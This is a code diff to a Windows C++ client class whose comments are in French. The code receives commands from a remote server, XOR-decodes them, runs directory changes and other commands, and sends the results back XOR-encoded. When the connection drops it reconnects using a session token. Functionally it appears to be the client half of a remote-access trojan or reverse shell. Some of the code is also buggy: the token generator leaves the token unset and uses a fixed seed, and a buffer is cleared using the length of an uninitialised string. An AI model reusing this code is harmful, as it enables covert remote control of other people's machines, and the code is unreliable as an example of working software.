@@ -50,7 +50,9 @@ int Connexion::main(bool is_admin, string path_prog)
 
     int i=0;
     char buffer[BUFFER_LEN];
-    string command,result;
+    string command;
+    vector <string> result;
+
     int len_recv=0;    
     
     int cmpt;
@@ -62,8 +64,9 @@ int Connexion::main(bool is_admin, string path_prog)
         //command.append(buffer,len_recv); 
         cout << "IN main client " << endl;
         Sleep(1000);
-        recvSafe(command,i);
         
+        command = recvSafe(i); //Recv safe and decrypt xor
+
         cout << "command in main ---->" << command <<"<------------"<<endl;
         cout << "command in main ---->" << command.length() <<"<------------"<<endl;
 
@@ -89,11 +92,11 @@ int Connexion::main(bool is_admin, string path_prog)
             ////cout << "Change directory" <<endl;
                 if(changeDirectory(command))
                 {
-                    result = "Error when changing folder.";
+                    result.push_back("Error when changing folder.");
                 }
                 else
                 {
-                    result = getPath();   
+                    result.push_back(getPath());   
                 }
                 //send(sock_client,result.c_str(),strlen(result.c_str()),0);
                 sendSafe(result);
@@ -138,7 +141,6 @@ int Connexion::main(bool is_admin, string path_prog)
                 }
                 cout << "send " << endl;
                 //FAUX sendSafe("\r\n"); //allows to send a confirmation to the server 
-                //send(sock_client, "\r\n")
             }
             else
             {
@@ -147,30 +149,31 @@ int Connexion::main(bool is_admin, string path_prog)
                 if(command.substr(0,3) == "[-]")
                 {;} //if error not append path.
                 else
-                {result += getPath();}
+                {result.push_back(getPath());}
                 
                 sendSafe(result);
-                
             }
         }
         cout << "ERASE ALL " << endl;
         command.erase();
-        result.erase();
+        result.clear(); 
         i++;
     }
 //        memset(buffer,0,sizeof(buffer));
-        //////cout << "erase ok !" <<endl;
+
     return 0;
 }
-void Connexion::recvSafe(string &command,int i)
+string Connexion::recvSafe(int i)
 {//allows you to receive data while managing errors 
     char buffer[BUFFER_LEN];
+    string result;
+    
+    ZeroMemory(&buffer, strlen(buffer));
+
     int len_recv=recv(sock_client,buffer,sizeof(buffer),0);
-    cout << "len recv: " << len_recv << endl;
-    cout << "BUFFER: " << buffer << endl;
 
     cout << "compteur: " << i <<endl;
-
+    
     if(len_recv==SOCKET_ERROR)
     {
         cout <<"error in recvsafe, go to reconnect" <<endl;
@@ -179,76 +182,73 @@ void Connexion::recvSafe(string &command,int i)
     }
     else
     {
-        string tmp = buffer;
-        command = XORData(tmp);
-        cout << "COmmand: " << command << endl;
+        result.append(buffer,len_recv);
+        cout << "COmmand: " << result << endl;
+        cout << "strlen command: " << strlen(buffer) << endl;
+        cout << "size command string " << result.size() << endl;
         //command.append(XORData);
         
-        if(command.empty())
+        if(result.empty())
         {
             //If command empty re connect to server.
             cout << "[--]empty go to reconnect" <<endl;
-            //system("PAUSE");
+
             reConnect();
+            return "";
         }
-        
     }
+    return XOREncryption(result);
 }
 
 
-void Connexion::sendSafe(string data)
+void Connexion::sendSafe(vector<string> result_of_command)
 { /*send data and manage errors, also allows to segment the data if it is too big.
 Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
     int iResult=0;
-    bool is_modulo=false;
-    int len_data = data.length();
-    float nb_d_envoi =  float(len_data)  / float(BUFFER_LEN);
-    int i=0;
 
-    cout << nb_d_envoi << endl;
-    if(len_data > BUFFER_LEN)
+    int i=0;
+    int size_all_result_of_command = 0;
+    string end = "\r\n"; //END CONNECTION.
+    string request = "";
+
+    cout << "\n\n\n\n"  << endl;
+
+    //nb_d_envoi -= 1; //NOT DELETE !!
+
+    if(result_of_command.size() >= 1) 
     {        
-        if((len_data%BUFFER_LEN)==0)
+        
+        for(i=0;i< result_of_command.size(); i++)
         {
-            //is modulo 0 !
-            ////ex 1000 ≡ 0 (mod 10)
-            //you don't need to send a request again - see #!
-            is_modulo = true;
+            cout << "Send request..." << endl;
+            request = result_of_command[i];
+            cout << "size request..." << request.length() << endl;
             
-        }
-        for(i=0;i <= int(nb_d_envoi);i++)
-        {
-            if(i == 0)
-            {
-                //cout <<i <<": ----------> " << data.substr(0,BUFFER_LEN);
-                iResult=send(sock_client, data.substr(0,BUFFER_LEN).c_str(), BUFFER_LEN, 0);
-                checkSend(iResult);
-            }
-            else
-            {
-                iResult=send(sock_client, data.substr(BUFFER_LEN*i , BUFFER_LEN*(i+1)).c_str(),BUFFER_LEN, 0);
-                checkSend(iResult);
-            }
-            if(int(nb_d_envoi)==i && is_modulo == false) //#!
-            {
-                cout << "no modulo:" << endl;
-                cout << data.length() << endl;
-                iResult=send(sock_client, data.substr(BUFFER_LEN*i).c_str(), strlen(data.substr(BUFFER_LEN*i).c_str()), 0);
-                checkSend(iResult);
-            }
+            send(sock_client, XOREncryption(request).c_str(), request.length(),0);
+            cout << "send okkkkk" << endl;
+
+            size_all_result_of_command += request.length();
+            Sleep(100);
         }
     }
+
     else
     {
-        iResult = send(sock_client, data.c_str(), strlen(data.c_str()),0);
+        request = result_of_command[0];
+
+        iResult = send(sock_client, XOREncryption(request).c_str(), request.length(),0);
         checkSend(iResult);
+        size_all_result_of_command += request.length();
     }
     
-    cout << "NB request: " << i << endl;
-    iResult=send(sock_client,"\r\n",2,0); // send end communication.
+    cout << "NB ENVOI " << result_of_command.size() << endl;
+    cout << size_all_result_of_command << endl;
+    
+    iResult=send(sock_client,XOREncryption(end).c_str(),2,0); // send end communication.
     checkSend(iResult);
-   
-    ////cout << "send ok " <<endl;
+
+    cout <<"STOP SEND" << endl;
+
 }
 
 
@@ -280,7 +280,9 @@ void Connexion::closeConnexion()
 
 void Connexion::reConnect()
 {   
-    cout <<"\n\n\nRECONECTTTTTT" << endl;
+    string request;
+
+    cout <<"\n\nRECONECTTTTTT" << endl;
     cout << "[+] Reconnect to server..." << endl;  
     //if the client has a token then reconnects without handshaking
 
@@ -289,10 +291,13 @@ void Connexion::reConnect()
     openConnexion();
     
     cout << "\n\n[+] Send MOD_RECONNECT to server " << endl;
-    sendUltraSafe(sock_client,"MOD_RECONNECT" SPLIT  TOKEN); //send token
-    cout << "[+] Send tokken to server: "<< TOKEN  << endl;
+    request = ("MOD_RECONNECT" SPLIT  +a_token);
+    cout << "REQ" << request << endl;
 
-    sendUltraSafe(sock_client, "\r\n");
+    sendUltraSafe(sock_client, XOREncryption(request)); //send token
+    cout << "[+] Send tokken to server: "<< a_token  << endl;
+
+    sendUltraSafe(sock_client, XOREncryption("\r\n"));
     cout << "Sendultrasafe sucess !!!" << endl;
    // system("PAUSE");
    cout <<"END RECONNECT\n\n" << endl;
@@ -304,3 +309,22 @@ int Connexion::getSocket()
     return sock_client;
 }
 
+void Connexion::setToken(string token)
+{
+    if(!token.empty())
+    {
+        a_token = token;
+    }
+    else
+    {
+        //if token is empty.
+        char hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
+        int i;
+
+        srand(0); 
+
+        for(i=0;i< 24 ;i++){token += hex_characters[rand()%16];}
+        a_token;
+    }
+    
+}
